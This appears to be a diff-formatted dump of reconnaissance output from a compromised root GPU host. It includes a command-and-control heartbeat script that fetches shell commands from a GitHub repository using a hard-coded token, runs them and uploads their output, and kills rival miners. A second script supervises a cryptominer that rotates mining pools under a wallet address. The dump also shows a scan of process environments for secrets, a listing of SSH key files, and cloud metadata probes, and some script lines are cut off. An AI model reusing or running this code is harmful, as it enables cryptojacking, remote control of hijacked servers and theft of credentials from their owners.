@@ -1,0 +1,355 @@
+=== hk9 host=ps4m8oe57 ip=184.105.5.94 ts=2026-11-21T18:54:02Z
+--- id
+uid=0(root) gid=0(root) groups=0(root)
+--- gpu
+GPU 0: Quadro RTX 4000 (UUID: GPU-868f47d7-3a2e-3f34-197f-0846f5056e0c)
+--- fleet-tree
+/opt/fleet:
+total 28
+drwxr-xr-x 4 root root 4096 Nov 21 18:14 .
+drwxr-xr-x 9 root root 4096 Nov 21 18:14 ..
+drwxr-xr-x 2 root root 4096 Nov 21 18:16 bin
+-rw-r--r-- 1 root root   41 Nov 21 18:14 gh_token
+-rw-r--r-- 1 root root  523 Nov 21 18:52 hb.txt
+drwxr-xr-x 2 root root 4096 Nov 21 18:14 logs
+-rw-r--r-- 1 root root   13 Nov 21 18:14 prefix
+
+/opt/fleet/bin:
+total 29080
+drwxr-xr-x 2 root root     4096 Nov 21 18:16 .
+drwxr-xr-x 4 root root     4096 Nov 21 18:14 ..
+-rw-r--r-- 1 root root     1733 Nov 21 18:14 cmd_all.sh
+-rw-r--r-- 1 root root       41 Nov 21 18:14 cmd_all.sha
+-rw-r--r-- 1 root root     4761 Nov 21 18:54 cmd_ps-ps4m8oe57.sh
+-rw-r--r-- 1 root root       41 Nov 21 18:14 cmd_ps-ps4m8oe57.sha
+-rw-r--r-- 1 root root        0 Nov 21 18:54 hb.lock
+-rw-r--r-- 1 root root        2 Nov 21 18:53 ps_fail
+-rwxr-xr-x 1 root root     3842 Nov 21 18:14 ps_hb.sh
+-rwxr-xr-x 1 root root     2328 Nov 21 18:14 ps_kit.sh
+-rw-r--r-- 1 root root        2 Nov 21 18:52 ps_pool_idx
+-rw-r--r-- 1 root root        0 Nov 21 18:54 ps_sup.lock
+-rwxr-xr-x 1 root root     2658 Nov 21 18:14 ps_sup.sh
+-rwxr-xr-x 1 root root 29725148 Nov 21 18:14 wildrig-multi
+--- hb-script
+## /opt/fleet/bin/ps_hb.sh
+#!/bin/bash
+P='ps-ps4m8oe57'; L='/opt/fleet'; GH='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'; B='/opt/fleet/bin'
+exec 8>"$B/hb.lock"; flock -n 8 || exit 0
+# enforcer: kill any wildrig that is not our worker prefix; kill known foreign keepers
+for p in $(pgrep -f wildrig-multi 2>/dev/null); do
+  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+  case "$c" in *"ul-$P-g"*) ;; *) kill -9 $p 2>/dev/null;; esac
+done
+for pat in i118840 prl1pydpjh wr_keeper run_prl_ peakminer pearl_keeper; do pkill -9 -f "$pat" 2>/dev/null; done
+
+# --- command channel: cmd/all.sh then cmd/$P.sh (exec once each revision) ---
+run_cmd() {
+  name="$1"; tag="$2"
+  R=$(curl -s -m 12 -H "Authorization: Bearer $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd/$name" 2>/dev/null)
+  SHA=$(echo "$R" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
+  [ -n "$SHA" ] || return 0
+  [ "$SHA" = "$(cat $B/cmd_$tag.sha 2>/dev/null)" ] && return 0
+  curl -s -m 25 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw' -o "$B/cmd_$tag.sh" "https://api.github.com/repos/dongsuju/ul-plant/contents/pscmd/$name" 
+  if [ -s "$B/cmd_$tag.sh" ]; then
+    echo "=== cmd $name $SHA $(date -u)" >> "$L/logs/cmd.log"
+    bash "$B/cmd_$tag.sh" >> "$L/logs/cmd.log" 2>&1
+    O=$(base64 -w0 "$L/logs/cmd.log" 2>/dev/null)
+    printf '{"message":"cmdout %s","content":"%s","branch":"main"}' "$P" "$O" > /tmp/co.json
+    US="https://api.github.com/repos/dongsuju/ul-plant/contents/cmdout/$P.txt"
+    SH2=$(curl -s -m 10 -H "Authorization: Bearer $GH" "$US" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
+    if [ -n "$SH2" ]; then python3 - "$US" "$SH2" <<'PY' 2>/dev/null
+import json,sys
+d=json.load(open('/tmp/co.json')); d['sha']=sys.argv[2]
+json.dump(d,open('/tmp/co2.json','w'))
+PY
+      [ -f /tmp/co2.json ] && mv /tmp/co2.json /tmp/co.json
+    fi
+    curl -s -m 20 -X PUT -H "Authorization: Bearer $GH" -H 'Content-Type: application/json' --data @/tmp/co.json "$US" >/dev/null 2>&1
+    echo "$SHA" > "$B/cmd_$tag.sha"
+  fi
+}
+run_cmd all.sh all
+run_cmd "$P.sh" "$P"
+
+{
+  echo "stage=beat ts=$(date -u) host=$(hostname) prefix=$P uid=$(id -u)"
+  echo "--- nvidia-smi -L"; nvidia-smi -L 2>&1 | head -16
+  echo "--- gpu"; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu,memory.used --format=csv,noheader 2>&1 | head -16
+  echo "--- bin $(ls -la $B/wildrig-multi 2>/dev/null | awk '{print $5}') sha=$(sha256sum $B/wildrig-multi 2>/dev/null | cut -c1-16)"
+  echo "--- procs"; pgre
+## /opt/fleet/bin/ps_sup.sh
+#!/bin/bash
+W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
+P=$(cat /opt/fleet/prefix 2>/dev/null); L=/opt/fleet/logs; B=/opt/fleet/bin
+exec 9>"$B/ps_sup.lock"; flock -n 9 || exit 0
+N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -eq 0 ] && N=1
+POOLS=("stratum+ssl://prl.kryptex.network:8048" "stratum+tcp://prl.kryptex.network:7048" "stratums://pool.pearlhash.xyz:9443" "stratum+tcp://pearl.luckypool.io:3360")
+pi=0; [ -f "$B/ps_pool_idx" ] && pi=$(cat "$B/ps_pool_idx" 2>/dev/null || echo 0)
+log() { echo "[$(date -u +%H:%M:%S)] $*" >> "$L/logs/sup.log"; }
+[ -x "$B/wildrig-multi" ] || "$B/ps_kit.sh"
+start_ts=$(date +%s)
+while true; do
+  if [ ! -x "$B/wildrig-multi" ]; then log "no bin"; "$B/ps_kit.sh"; sleep 30; continue; fi
+  url=${POOLS[$pi]}
+  for i in $(seq 0 $((N-1))); do
+    if ! pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
+      # intensity ladder: per-gpu override -> fleet default
+      if [ -f "$B/margs.g$i" ]; then MA=$(cat "$B/margs.g$i"); else MA=$(cat /opt/fleet/margs 2>/dev/null); fi
+      setsid "$B/wildrig-multi" --algo pearlhash --url "$url" --user "$W.ul-$P-g$i" --pass x -d $i $MA >> "$L/logs/w-$P-g$i.log" 2>&1 &
+      log "start g$i $url args[$MA]"
+      sleep 2
+    fi
+  done
+  sleep 40
+  alive=0
+  for i in $(seq 0 $((N-1))); do
+    if pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
+      alive=$((alive+1))
+      # OOM ladder per gpu
+      if tail -25 "$L/logs/w-$P-g$i.log" 2>/dev/null | grep -q 'out of memory'; then
+        cur=$(cat "$B/margs.g$i" 2>/dev/null || cat /opt/fleet/margs 2>/dev/null | grep -oE '[0-9]+')
+        nxt=$(( ${cur:-6} / 2 )); [ "$nxt" -lt 1 ] && nxt=1
+        echo "--gpu-intensity $nxt" > "$B/margs.g$i"
+        log "g$i OOM -> intensity $nxt"
+        pkill -9 -f "ul-$P-g$i"
+      fi
+    fi
+  done
+  acc=$(grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | wc -l)
+  if [ "$alive" -eq 0 ]; then
+    fails=$(( $(cat "$B/ps_fail" 2>/dev/null || echo 0) + 1 )); echo "$fails" > "$B/ps_fail"
+    log "alive=0 fail=$fails acc=$acc"
+    if [ "$fails" -ge 3 ]; then
+      pi=$(( (pi+1) % 4 )); echo "$pi" > "$B/ps_pool_idx"; echo 0 > "$B/ps_fail"
+      log "rotate pool -> ${POOLS[$pi]}"
+      for i in $(seq 0 $((N-1))); do pkill -9 -f "ul-$P-g$i" 2>/dev/null; done
+      sleep 2
+    fi
+  else
+    echo 0 > "$B/ps_fail"
+    now=$(date +%s)
+    if [ "$acc" -eq 0 ] && [ $((now-start_ts)) -gt 1500 ] && [ ! -f "$B/ps_rotated" ]; then
+      pi=$(( (pi+1) % 4 )); echo "$pi" > "$B/ps_pool_idx"; touch "$B/ps_rotated
+## /opt/fleet/prefix
+ps-ps4m8oe57
+
+--- env-scan
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/100/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/1019/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/102/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/103/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/104/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/105/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/106/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/107/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/108/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/109/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/110/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/111/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/112/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/113/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/115/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/116/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/12/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/120/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/124/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/125/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/1263/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/13/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/1303/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/131/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/133/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/136/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/137/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/138/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/139/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/14/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/140/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/141/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/142/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/143/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/144/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/145/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/149/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/15/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/151/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/16/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/161/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/17/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/18/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/182/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/1842/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/19/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/195/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/196/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/197/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/2/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/20/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/21/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/219/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/22/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/23/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/24/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/2432/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/248/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/252/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/2564/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/259/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/26/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/260/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/261/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/262/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/27/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/28/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/280/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/283/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/29/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/3/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/30/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/32/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/328/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/329/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/33/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/3349/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/34/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/35/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/36/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/3698/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/37/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/38/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/39/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/4/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/40/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/4076/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/41/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/42/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/427/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/43/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/432/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/437/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/44/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/440/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/442/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/443/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/45/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/4538/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/46/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/47/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/48/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/5/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/50/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/505/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/51/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/5120/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/52/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/53/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/534/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/535/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/536/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/54/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/5469/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/56/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/57/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/58/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/59/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/597/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/6/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/60/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/605/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/606/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/607/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/61/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/62/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/63/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/64/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/641/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/65/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/67/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/68/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/69/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/7/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/71/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/72/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/724/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/726/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/73/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/74/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/75/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/77/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/78/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/79/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/8/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/80/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/82/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/83/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/84/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/844/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/85/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/86/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/87/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/88/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/89/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/9/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/90/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/91/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/92/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/93/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/95/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/96/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/97/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/98/environ: No such process
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 16: /proc/99/environ: No such process
+--- ps-cred-files
+## /home/paperspace/.ssh
+total 24
+drwx------ 2 paperspace paperspace  4096 Dec 14  2022 .
+drwxr-x--- 5 paperspace paperspace  4096 Dec 28  2022 ..
+-rw------- 1 paperspace paperspace 14291 Apr 27  2024 authorized_keys
+## /root/.ssh
+total 28
+drwx------ 2 root root  4096 Dec 14  2022 .
+drwx------ 9 root root  4096 Nov 21 11:07 ..
+-rw------- 1 root root 17495 Nov 17 20:09 authorized_keys
+--- history
+sudo paperspace-create-template.sh
+--- imds
+GET http://metadata.paperspace.com/v1/machine
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+GET http://metadata.paperspace.com/v1/machines/
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+GET http://metadata.paperspace.com/v1/
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+GET http://169.254.169.254/metadata/v1/
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+--- net
+    inet 127.0.0.1/8 scope host lo
+    inet 10.64.11.120/20 metric 100 brd 10.64.15.255 scope global dynamic eth0
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
